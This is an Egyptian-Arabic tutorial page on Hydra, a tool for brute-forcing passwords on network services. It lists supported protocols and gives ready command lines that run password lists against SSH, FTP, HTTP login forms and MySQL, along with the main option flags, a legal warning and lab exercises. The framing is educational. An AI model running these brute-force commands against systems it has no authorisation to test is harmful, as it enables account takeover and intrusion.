Hydra

أداة كسر باسوردات الخدمات الشبكية

يعني إيه Hydra؟

Hydra هي أداة لكسر باسوردات الخدمات الشبكية (SSH, FTP, HTTP, MySQL, RDP وغيرها). بتشتغل بطريقة "القوة الغاشمة" عن طريق تجريب قوائم من اليوزرنيمات والباسوردات على خدمة معينة.

الأداة دي بتدعم أكتر من 50 بروتوكول — وبتعتبر الأسرع في مجالها.

الخدمات اللي بتدعمها

  • SSH (بورت 22)
  • FTP (بورت 21)
  • HTTP/HTTPS (بورت 80/443)
  • MySQL (بورت 3306)
  • RDP (بورت 3389)
  • SMTP, POP3, IMAP

التثبيت

pkg install hydra -y hydra -h

الأوامر الأساسية

1. كسر SSH

hydra -l admin -P passwords.txt ssh://192.168.1.1

-l: يوزر واحد | -P: قائمة باسوردات

2. كسر FTP

hydra -l admin -P passwords.txt ftp://192.168.1.1

3. كسر HTTP Login

hydra -l admin -P passwords.txt 192.168.1.1 http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

4. كسر MySQL

hydra -l root -P passwords.txt mysql://192.168.1.1

الخيارات

  • -l: يوزر واحد
  • -L: قائمة يوزرز من ملف
  • -p: باسورد واحد
  • -P: قائمة باسوردات من ملف
  • -t: عدد العمليات المتوازية (افتراضي 16)
  • -s: بورت مخصص
  • -V: عرض كل محاولة
  • -f: وقف عند أول نجاح
تحذير: Hydra بتلمس السيرفر وبتتسجل في اللوجات. متستخدمهاش على أي خدمة مش بتاعتك. قانون 175/2018 — حبس 3-5 سنين.

تمارين

  1. شغّل SSH على جهازك وجرب Hydra على localhost
  2. جرب Hydra على TryHackMe (بيئة آمنة)
  3. اعمل قائمة باسوردات مخصصة
